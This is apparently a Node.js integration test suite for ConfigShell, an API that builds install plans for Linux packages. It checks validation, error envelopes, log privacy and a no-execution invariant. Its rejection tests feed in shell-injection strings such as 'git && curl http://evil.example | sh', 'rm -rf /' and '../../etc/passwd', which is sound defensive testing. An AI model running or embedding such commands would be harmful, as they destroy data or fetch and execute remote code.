/**
 * API integration tests.
 *
 * These run the real application — real routing, real middleware, the real
 * catalog and the real installer — against an ephemeral port. Nothing is
 * mocked, because the things most worth testing here are exactly the ones a
 * mock would paper over: that validation rejects what it should, that errors
 * never leak internals, and that a generated command cannot contain anything
 * but catalog data.
 */

import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { after, before, describe, test } from "node:test";
import { createApp } from "./app.js";

/** @type {import("node:http").Server} */
let server;
let baseUrl;

before(async () => {
  process.env.NODE_ENV = "test"; // silences the logger
  server = createApp().listen(0);
  await new Promise((resolve) => server.once("listening", resolve));
  baseUrl = `http://127.0.0.1:${server.address().port}`;
});

after(() => new Promise((resolve) => server.close(resolve)));

async function get(path) {
  const response = await fetch(`${baseUrl}${path}`);
  return { status: response.status, body: await response.json() };
}

async function post(path, body) {
  const response = await fetch(`${baseUrl}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: typeof body === "string" ? body : JSON.stringify(body),
  });
  return { status: response.status, body: await response.json() };
}

// ------------------------------------------------------------------- health

describe("GET /health", () => {
  test("integrity covers role presets too, not just applications", async () => {
    // A preset naming a removed application is stale trusted data, which is the
    // same class of problem as an invalid catalog entry.
    const { body } = await get("/health");
    assert.equal(body.data.catalog.errorCount, 0);
  });

  test("reports liveness and catalog integrity", async () => {
    const { status, body } = await get("/health");
    assert.equal(status, 200);
    assert.equal(body.data.status, "ok");
    assert.deepEqual(body.data.catalog, { valid: true, errorCount: 0 });
  });

  test("states that this process never executes commands", async () => {
    const { body } = await get("/health");
    assert.equal(body.data.capabilities.executesCommands, false);
  });

  test("is reachable at /api/health too, so one proxy rule covers the whole API", async () => {
    const direct = await get("/health");
    const underApi = await get("/api/health");
    assert.equal(underApi.status, 200);
    assert.equal(underApi.body.data.status, direct.body.data.status);
  });

  test("leaks nothing about the host", async () => {
    const { body } = await get("/health");
    const serialised = JSON.stringify(body);
    for (const value of ["/home", "node_modules", process.cwd()]) {
      assert.ok(!serialised.includes(value), `health response leaked ${value}`);
    }
  });
});

// ------------------------------------------------------------- applications

describe("GET /api/applications", () => {
  test("returns the whole catalog by default", async () => {
    const { status, body } = await get("/api/applications");
    assert.equal(status, 200);
    assert.ok(body.data.total >= 30);
    assert.equal(body.data.applications.length, body.data.total);
  });

  test("searches and filters", async () => {
    const search = await get("/api/applications?query=vscode");
    assert.deepEqual(
      search.body.data.applications.map((a) => a.id),
      ["vscode"],
    );

    const filtered = await get("/api/applications?category=Browsers");
    assert.ok(filtered.body.data.applications.every((a) => a.category === "Browsers"));
  });

  test("rejects an unknown category and says what is supported", async () => {
    const { status, body } = await get("/api/applications?category=Nonsense");
    assert.equal(status, 400);
    assert.equal(body.error.code, "INVALID_REQUEST");
    assert.ok(Array.isArray(body.error.details.supported));
  });

  test("rejects an over-long query rather than matching it", async () => {
    const { status, body } = await get(`/api/applications?query=${"a".repeat(500)}`);
    assert.equal(status, 400);
    assert.equal(body.error.code, "INVALID_REQUEST");
  });
});

describe("GET /api/applications/:id", () => {
  test("returns one entry", async () => {
    const { status, body } = await get("/api/applications/git");
    assert.equal(status, 200);
    assert.equal(body.data.application.name, "Git");
    assert.equal(body.data.resolution, undefined, "no environment, no resolution");
  });

  test("resolves for a distribution when one is given, and explains the choice", async () => {
    const { body } = await get("/api/applications/git?distro=Fedora");
    assert.equal(body.data.resolution.outcome, "resolved");
    assert.equal(body.data.resolution.source.method, "dnf");
    assert.match(body.data.resolution.reason, /own repositories/);
    assert.ok(body.data.resolution.considered.length > 0, "rejected sources are recorded");
  });

  test("a resolution has the same shape here as it does in a plan", async () => {
    // These two endpoints returned different shapes for the same concept until
    // they were given a shared presenter — a client that could read one could
    // not read the other.
    const single = await get("/api/applications/vscode?distro=Ubuntu");
    const plan = await post("/api/plan", {
      environment: { distro: "Ubuntu" },
      applicationIds: ["vscode"],
    });

    const fromEndpoint = single.body.data.resolution;
    const fromPlan = plan.body.data.resolutions[0];
    assert.deepEqual(fromEndpoint, fromPlan);
  });

  test("a resolution reports eligibility rather than the policy's internal rank", async () => {
    const { body } = await get("/api/applications/vscode?distro=Ubuntu");
    const considered = body.data.resolution.considered;

    for (const candidate of considered) {
      assert.equal(typeof candidate.eligible, "boolean", JSON.stringify(candidate));
      assert.equal(candidate.rank, undefined, "the internal rank must not reach the wire");
      assert.equal(candidate.source, undefined, "sources are flattened, not nested");
      assert.ok(candidate.note.length > 0);
    }

    // VS Code's apt route is the vendor's own repository, which ConfigShell
    // will not add — so it must be reported as not usable, and the UI must be
    // told why rather than working it out again.
    const apt = considered.find((c) => c.method === "apt");
    assert.equal(apt.eligible, false);
    assert.match(apt.note, /vendor repository/);
  });

  test("distinguishes a malformed id (400) from an unknown one (404)", async () => {
    assert.equal((await get("/api/applications/NOT%20AN%20ID")).status, 400);
    assert.equal((await get("/api/applications/no-such-app")).status, 404);
  });

  test("rejects an unknown distribution", async () => {
    const { status, body } = await get("/api/applications/git?distro=Gentoo");
    assert.equal(status, 400);
    assert.equal(body.error.details.errors[0].field, "distro");
  });
});

// -------------------------------------------------------------- catalog meta

describe("GET /api/catalog/*", () => {
  test("categories and environments are discoverable, so clients need not hardcode them", async () => {
    const categories = await get("/api/catalog/categories");
    assert.ok(categories.body.data.categories.includes("Browsers"));

    const environments = await get("/api/catalog/environments");
    const ubuntu = environments.body.data.distros.find((d) => d.distro === "Ubuntu");
    assert.equal(ubuntu.ecosystem, "apt");
    assert.equal(environments.body.data.architectureAffectsResolution, false);
  });

  test("role presets are served whole, so a client can show what they contain", async () => {
    const { status, body } = await get("/api/catalog/roles");
    assert.equal(status, 200);
    assert.ok(body.data.roles.length >= 4);

    const web = body.data.roles.find((r) => r.id === "web-developer");
    assert.ok(web, "expected a web-developer preset");
    assert.ok(web.recommended.length > 0);
    assert.ok(web.name && web.description);

    // Every id a preset names must be a real catalog entry.
    const catalog = await get("/api/applications");
    const ids = new Set(catalog.body.data.applications.map((a) => a.id));
    for (const role of body.data.roles) {
      for (const id of [...role.recommended, ...role.optional]) {
        assert.ok(ids.has(id), `${role.id} names "${id}", which is not in the catalog`);
      }
    }
  });

  test("one preset by id, with the usual 400/404 distinction", async () => {
    assert.equal((await get("/api/catalog/roles/web-developer")).status, 200);
    assert.equal((await get("/api/catalog/roles/no-such-role")).status, 404);
    assert.equal((await get("/api/catalog/roles/NOT%20AN%20ID")).status, 400);
  });

  test("stats are computed from the data, not hardcoded", async () => {
    const { body } = await get("/api/catalog/stats");
    const applications = await get("/api/applications");
    assert.equal(body.data.applications, applications.body.data.total);
  });
});

// ---------------------------------------------------------------------- plan

describe("POST /api/plan", () => {
  const ubuntu = { distro: "Ubuntu" };

  test("produces ordered commands for a selection", async () => {
    const { status, body } = await post("/api/plan", {
      environment: ubuntu,
      applicationIds: ["git", "htop"],
    });
    assert.equal(status, 200);
    assert.deepEqual(
      body.data.commands.map((c) => c.command),
      ["sudo apt-get update", "sudo apt-get install git htop", "command -v git", "command -v htop"],
    );
  });

  test("always reports that nothing was executed", async () => {
    const { body } = await post("/api/plan", { environment: ubuntu, applicationIds: ["git"] });
    assert.equal(body.data.execution.executed, false);
    assert.equal(body.data.execution.executedBy, null);
  });

  test("marks privileged commands", async () => {
    const { body } = await post("/api/plan", { environment: ubuntu, applicationIds: ["git"] });
    for (const command of body.data.commands) {
      assert.equal(command.privileged, command.command.startsWith("sudo "));
    }
    assert.ok(body.data.summary.privilegedCommands > 0);
  });

  test("surfaces manual steps instead of dropping the application", async () => {
    const { body } = await post("/api/plan", { environment: ubuntu, applicationIds: ["cursor"] });
    assert.equal(body.data.commands.length, 0);
    assert.equal(body.data.manualSteps.length, 1);
    assert.equal(body.data.manualSteps[0].applicationId, "cursor");
    assert.equal(body.data.summary.manual, 1);
  });

  test("the plan itself carries steps as data, with no command text", async () => {
    const { body } = await post("/api/plan", {
      environment: ubuntu,
      applicationIds: ["git", "postman"],
    });
    const steps = JSON.stringify(body.data.steps);
    for (const fragment of ["apt-get", "sudo", "command -v"]) {
      assert.ok(!steps.includes(fragment), `steps leaked command text: ${fragment}`);
    }
  });

  test("is deterministic", async () => {
    const request = { environment: ubuntu, applicationIds: ["vlc", "git", "cursor"] };
    const first = await post("/api/plan", request);
    const second = await post("/api/plan", request);
    assert.deepEqual(first.body, second.body);
  });

  test("resolves the same selection differently per distribution", async () => {
    const ids = ["git"];
    const apt = await post("/api/plan", { environment: { distro: "Debian" }, applicationIds: ids });
    const arch = await post("/api/plan", {
      environment: { distro: "Arch Linux" },
      applicationIds: ids,
    });
    assert.ok(apt.body.data.commands.some((c) => c.command.includes("apt-get")));
    assert.ok(arch.body.data.commands.some((c) => c.command.includes("pacman")));
  });

  test("deduplicates a repeated selection rather than installing twice", async () => {
    const { body } = await post("/api/plan", {
      environment: ubuntu,
      applicationIds: ["git", "git", "git"],
    });
    const install = body.data.commands.find((c) => c.command.includes("apt-get install"));
    assert.equal(install.command, "sudo apt-get install git");
  });
});

// --------------------------------------------------------- plan: rejections

describe("POST /api/plan — untrusted input", () => {
  test("an unknown application id refuses the whole request", async () => {
    const { status, body } = await post("/api/plan", {
      environment: { distro: "Ubuntu" },
      applicationIds: ["git", "not-a-real-app"],
    });
    assert.equal(status, 422);
    assert.equal(body.error.code, "UNKNOWN_APPLICATION");
    assert.deepEqual(body.error.details.unknown, ["not-a-real-app"]);
    assert.match(body.error.message, /Nothing was planned/);
  });

  test("shell metacharacters in an id are rejected at the boundary", async () => {
    for (const id of [
      "git; rm -rf /",
      "git && curl http://evil.example | sh",
      "$(whoami)",
      "`id`",
      "../../etc/passwd",
      "git\nrm",
      "-rf",
      "GIT",
    ]) {
      const { status, body } = await post("/api/plan", {
        environment: { distro: "Ubuntu" },
        applicationIds: [id],
      });
      assert.ok(status === 400 || status === 422, `${JSON.stringify(id)} returned ${status}`);
      assert.ok(body.error, `${JSON.stringify(id)} produced no error`);
    }
  });

  test("a caller cannot pair a distribution with the wrong ecosystem", async () => {
    // The ecosystem is always derived from the distribution, never accepted.
    const { body } = await post("/api/plan", {
      environment: { distro: "Arch Linux", ecosystem: "apt" },
      applicationIds: ["git"],
    });
    assert.equal(body.data.environment.ecosystem, "pacman");
    assert.ok(body.data.commands.every((c) => !c.command.includes("apt")));
  });

  test("extra body fields are ignored, not honoured", async () => {
    const { body } = await post("/api/plan", {
      environment: { distro: "Ubuntu" },
      applicationIds: ["git"],
      command: "rm -rf /",
      packages: ["evil"],
      extraFlags: "--force",
    });
    const serialised = JSON.stringify(body.data.commands);
    assert.ok(!serialised.includes("rm -rf"));
    assert.ok(!serialised.includes("evil"));
    assert.ok(!serialised.includes("--force"));
  });

  test("a missing or malformed environment is rejected", async () => {
    for (const environment of [undefined, {}, { distro: "Gentoo" }, "Ubuntu", null, []]) {
      const { status } = await post("/api/plan", { environment, applicationIds: ["git"] });
      assert.equal(status, 400, `environment ${JSON.stringify(environment)}`);
    }
  });

  test("an empty, oversized or non-array selection is rejected", async () => {
    assert.equal(
      (await post("/api/plan", { environment: { distro: "Ubuntu" }, applicationIds: [] })).status,
      400,
    );
    assert.equal(
      (await post("/api/plan", { environment: { distro: "Ubuntu" }, applicationIds: "git" })).status,
      400,
    );
    const huge = await post("/api/plan", {
      environment: { distro: "Ubuntu" },
      applicationIds: Array.from({ length: 201 }, (_, i) => `app-${i}`),
    });
    assert.equal(huge.status, 413);
  });

  test("a body over the size limit is rejected before parsing", async () => {
    const { status, body } = await post(
      "/api/plan",
      JSON.stringify({
        environment: { distro: "Ubuntu" },
        applicationIds: Array.from({ length: 50_000 }, () => "git"),
      }),
    );
    assert.equal(status, 413);
    assert.equal(body.error.code, "REQUEST_TOO_LARGE");
  });

  test("malformed JSON produces the standard error envelope", async () => {
    const { status, body } = await post("/api/plan", "{ not json");
    assert.equal(status, 400);
    assert.equal(body.error.code, "INVALID_REQUEST");
    assert.match(body.error.message, /valid JSON/);
  });
});

// -------------------------------------------------------------- error shape

describe("errors", () => {
  test("an unmatched route returns the standard envelope, not HTML", async () => {
    const { status, body } = await get("/api/nope");
    assert.equal(status, 404);
    assert.equal(body.error.code, "NOT_FOUND");
  });

  test("no error response leaks a stack trace or a filesystem path", async () => {
    const responses = [
      await get("/api/nope"),
      await get("/api/applications?category=Nonsense"),
      await post("/api/plan", { environment: {}, applicationIds: ["git"] }),
      await post("/api/plan", "{ bad"),
    ];
    for (const { body } of responses) {
      const serialised = JSON.stringify(body);
      assert.ok(!serialised.includes("at "), "looks like a stack trace");
      assert.ok(!serialised.includes("/home/"), "leaked a filesystem path");
      assert.ok(!serialised.includes("node_modules"));
    }
  });

  test("every response carries a correlation id", async () => {
    const response = await fetch(`${baseUrl}/health`);
    assert.match(response.headers.get("x-request-id") ?? "", /^[0-9a-f-]{36}$/);
  });

  test("the framework is not advertised", async () => {
    const response = await fetch(`${baseUrl}/health`);
    assert.equal(response.headers.get("x-powered-by"), null);
  });
});

// ------------------------------------------------------------------ logging

describe("request logging", () => {
  test("logs the full request path, not the router-relative one", async () => {
    // Express rewrites `req.url` on entering a mounted router, so reading
    // `req.path` after routing reported `/api/applications` as `/`. The path is
    // captured from `originalUrl` before routing instead.
    const lines = [];
    const original = process.stdout.write.bind(process.stdout);
    const previousEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = "development"; // the logger is silenced under "test"
    process.stdout.write = (chunk, ...rest) => {
      lines.push(String(chunk));
      return original(chunk, ...rest);
    };

    try {
      await get("/api/applications?query=git");
      await get("/api/catalog/roles");
      // The finish handler fires after the response; give it a turn.
      await new Promise((resolve) => setImmediate(resolve));
    } finally {
      process.stdout.write = original;
      process.env.NODE_ENV = previousEnv;
    }

    const logged = lines
      .filter((line) => line.includes('"message":"request"'))
      .map((line) => JSON.parse(line));

    const paths = logged.map((entry) => entry.path);
    assert.ok(paths.includes("/api/applications"), `got ${JSON.stringify(paths)}`);
    assert.ok(paths.includes("/api/catalog/roles"), `got ${JSON.stringify(paths)}`);
    assert.ok(!paths.includes("/"), "a routed request was logged as the router-relative path");
  });

  test("never logs the query string", async () => {
    // Search terms are the caller's business.
    const lines = [];
    const original = process.stdout.write.bind(process.stdout);
    const previousEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = "development";
    process.stdout.write = (chunk, ...rest) => {
      lines.push(String(chunk));
      return original(chunk, ...rest);
    };

    try {
      await get("/api/applications?query=a-private-search-term");
      await new Promise((resolve) => setImmediate(resolve));
    } finally {
      process.stdout.write = original;
      process.env.NODE_ENV = previousEnv;
    }

    assert.ok(
      !lines.join("").includes("a-private-search-term"),
      "the query string reached the log",
    );
  });
});

// ------------------------------------------------------- serving the web app

describe("serving the built web app", () => {
  // In production the web app and the API share an origin, because the web app
  // calls this API for anything the resolver decides. Serving the build from
  // here is how they do that: one process, one port, no CORS story.
  let distServer;
  let distBase;
  let distDir;

  before(async () => {
    const { mkdtempSync, writeFileSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    distDir = mkdtempSync(join(tmpdir(), "configshell-dist-"));
    writeFileSync(join(distDir, "index.html"), "<!doctype html><title>ConfigShell</title>");
    writeFileSync(join(distDir, "app.js"), "// built asset");

    distServer = createApp({ webDist: distDir }).listen(0);
    await new Promise((resolve) => distServer.once("listening", resolve));
    distBase = `http://127.0.0.1:${distServer.address().port}`;
  });

  after(() => new Promise((resolve) => distServer.close(resolve)));

  test("serves index.html at the root and real files as themselves", async () => {
    const root = await fetch(`${distBase}/`);
    assert.equal(root.status, 200);
    assert.match(root.headers.get("content-type") ?? "", /text\/html/);

    const asset = await fetch(`${distBase}/app.js`);
    assert.equal(asset.status, 200);
    assert.match(await asset.text(), /built asset/);
  });

  test("falls back to index.html for client-side routes", async () => {
    const response = await fetch(`${distBase}/some/spa/route`);
    assert.equal(response.status, 200);
    assert.match(response.headers.get("content-type") ?? "", /text\/html/);
  });

  test("never shadows the API or health with a static file", async () => {
    // The fallback must skip /api, or an unknown endpoint would answer with the
    // SPA's HTML and a client would parse a page as a plan.
    const unknown = await fetch(`${distBase}/api/nope`);
    assert.equal(unknown.status, 404);
    assert.match(unknown.headers.get("content-type") ?? "", /application\/json/);
    assert.equal((await unknown.json()).error.code, "NOT_FOUND");

    const health = await fetch(`${distBase}/health`);
    assert.equal(health.status, 200);
    assert.equal((await health.json()).data.status, "ok");

    const plan = await fetch(`${distBase}/api/plan`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ environment: { distro: "Fedora" }, applicationIds: ["git"] }),
    });
    assert.equal(plan.status, 200);
  });

  test("the API works on its own when no build is present", async () => {
    // `pnpm dev` and a fresh clone both run without a build; the API must not
    // depend on one existing.
    const server = createApp({ webDist: null }).listen(0);
    await new Promise((resolve) => server.once("listening", resolve));
    try {
      const base = `http://127.0.0.1:${server.address().port}`;
      assert.equal((await fetch(`${base}/health`)).status, 200);

      const spa = await fetch(`${base}/some/spa/route`);
      assert.equal(spa.status, 404, "with no build there is nothing to fall back to");
      assert.match(spa.headers.get("content-type") ?? "", /application\/json/);
    } finally {
      await new Promise((resolve) => server.close(resolve));
    }
  });
});

// ------------------------------------------------------------ safety invariant

describe("safety invariants", () => {
  test("the server never executes anything", async () => {
    // Structural, not behavioural: no module in the server imports a process
    // API. This is the property the security model rests on, so it is asserted
    // rather than assumed.
    const { readFileSync } = await import("node:fs");
    const { sourceFiles, stripComments } = await import("@configshell/test-utils");

    const sources = [
      ...sourceFiles(
        new URL(".", import.meta.url).pathname,
        (name) =>
          (name.endsWith(".ts") || name.endsWith(".js")) && !name.includes(".test."),
      ),
      // `api/` is a possible serverless deployment directory — scan it too if
      // it exists, so the safety invariant covers any deployment shape.
      ...(existsSync(new URL("../../../api", import.meta.url).pathname)
        ? sourceFiles(
            new URL("../../../api", import.meta.url).pathname,
            (name) => name.endsWith(".ts") || name.endsWith(".js"),
          )
        : []),
    ];

    const offenders = [];
    for (const file of sources) {
      const source = stripComments(readFileSync(file, "utf8"));
      for (const forbidden of ["child_process", "execSync", "spawnSync", "execFile"]) {
        if (source.includes(forbidden)) offenders.push(`${file}: ${forbidden}`);
      }
    }

    assert.deepEqual(offenders, [], "the API server must never be able to run a command");
  });

  test("no generated command contains a shell metacharacter", async () => {
    const { body: catalog } = await get("/api/applications");
    const ids = catalog.data.applications.map((a) => a.id);

    for (const distro of ["Ubuntu", "Debian", "Fedora", "Arch Linux"]) {
      const { body } = await post("/api/plan", {
        environment: { distro },
        applicationIds: ids,
      });
      for (const { command } of body.data.commands) {
        assert.match(command, /^[A-Za-z0-9 _.+-]+$/, `${distro}: ${command}`);
      }
    }
  });
});
